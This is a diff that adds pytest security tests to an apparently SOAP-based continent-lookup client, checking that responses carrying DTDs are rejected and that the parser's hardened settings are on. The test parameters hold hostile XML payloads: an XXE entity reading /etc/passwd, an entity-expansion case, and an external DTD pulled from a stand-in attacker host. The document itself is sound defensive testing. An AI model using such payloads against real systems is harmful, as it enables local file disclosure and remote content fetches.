@@ -253,3 +253,39 @@ def test_malformed_record_is_a_502_through_the_api(rsps):
     )
     assert response.status_code == 502
     assert response.json()["code"] == "upstream_bad_response"
+
+
+# --- untrusted XML ---------------------------------------------------------------------------
+
+CONTINENT = "<m:tContinent><m:sCode>&e;</m:sCode><m:sName>x</m:sName></m:tContinent>"
+
+
+@pytest.mark.parametrize(
+    "prolog, result",
+    [
+        # XXE: an external entity pointing at a local file.
+        ('<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>', CONTINENT),
+        # "Billion laughs" style internal entity expansion.
+        ('<!DOCTYPE x [<!ENTITY e "lol">]>', CONTINENT),
+        # An external DTD that a careless parser would download.
+        ('<!DOCTYPE x SYSTEM "http://attacker.test/evil.dtd">', ""),
+        # Even a harmless DOCTYPE: SOAP messages must not have one.
+        ("<!DOCTYPE x>", ""),
+    ],
+)
+def test_responses_with_a_dtd_are_rejected_without_resolving_anything(
+    gateway, rsps, prolog, result
+):
+    body = envelope("ListOfContinentsByCode", result, prolog=prolog)
+    rsps.post(ENDPOINT, body=body, content_type="text/xml")
+    with pytest.raises(UpstreamBadResponse) as caught:
+        gateway.list_continents()
+    assert "root:" not in str(caught.value.__cause__)  # /etc/passwd was never read
+    assert len(rsps.calls) == 1  # only the SOAP call: nothing was fetched, nothing retried
+
+
+def test_the_client_uses_the_hardened_xml_settings():
+    service = build_service(DEFAULT_WSDL_PATH, ENDPOINT, timeout_seconds=1)
+    settings = service._client.settings
+    assert settings.forbid_dtd and settings.forbid_entities and settings.forbid_external
+    assert settings.strict and not settings.xml_huge_tree
